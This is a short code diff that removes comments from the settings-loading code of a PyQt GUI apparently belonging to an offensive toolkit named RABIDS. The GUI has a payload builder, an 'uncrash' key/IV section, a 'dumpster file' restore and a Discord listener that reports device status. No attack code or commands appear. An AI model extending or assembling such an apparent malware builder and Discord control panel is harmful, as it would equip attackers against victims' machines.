@@ -106,7 +106,6 @@ class DiscordListener(QObject):
             print(f'GUI Listener logged in as {self.client.user}')
             self.device_status_update.emit("SYSTEM", f"Connected to Discord as {self.client.user}")
             
-            # Try to find the creator user to fetch DM history
             creator_found = False
             if self.creator_id:
                 try:
@@ -1415,7 +1414,6 @@ class RABIDSGUI(QMainWindow):
             with open(config_path, 'r') as f:
                 config = json.load(f)
 
-            # Builder settings
             builder_cfg = config.get("builder", {})
             self.exe_name_input.setText(builder_cfg.get("exe_name", "payload"))
             self.target_os_combo.setCurrentText(builder_cfg.get("target_os", "windows"))
@@ -1426,7 +1424,6 @@ class RABIDSGUI(QMainWindow):
             self.selected_modules = builder_cfg.get("module_chain", [])
             self.current_option_values = builder_cfg.get("module_options", {})
 
-            # Uncrash settings
             uncrash_cfg = config.get("uncrash", {})
             self.uncrash_key_edit.setText(uncrash_cfg.get("key", ""))
             self.uncrash_iv_edit.setText(uncrash_cfg.get("iv", ""))
@@ -1435,12 +1432,10 @@ class RABIDSGUI(QMainWindow):
             self.uncrash_os_combo.setCurrentText(uncrash_cfg.get("os", "windows"))
             self.uncrash_arch_combo.setCurrentText(uncrash_cfg.get("arch", "amd64"))
 
-            # Garbage Collector settings
             gc_cfg = config.get("garbage_collector", {})
             self.restore_dumpster_file_edit.setText(gc_cfg.get("dumpster_file", ""))
             self.restore_output_dir_edit.setText(gc_cfg.get("output_dir", ""))
 
-            # Listener settings
             listener_cfg = config.get("listener", {})
             self.listener_token_edit.setText(listener_cfg.get("token", ""))
             self.listener_creator_id_edit.setText(listener_cfg.get("creator_id", ""))
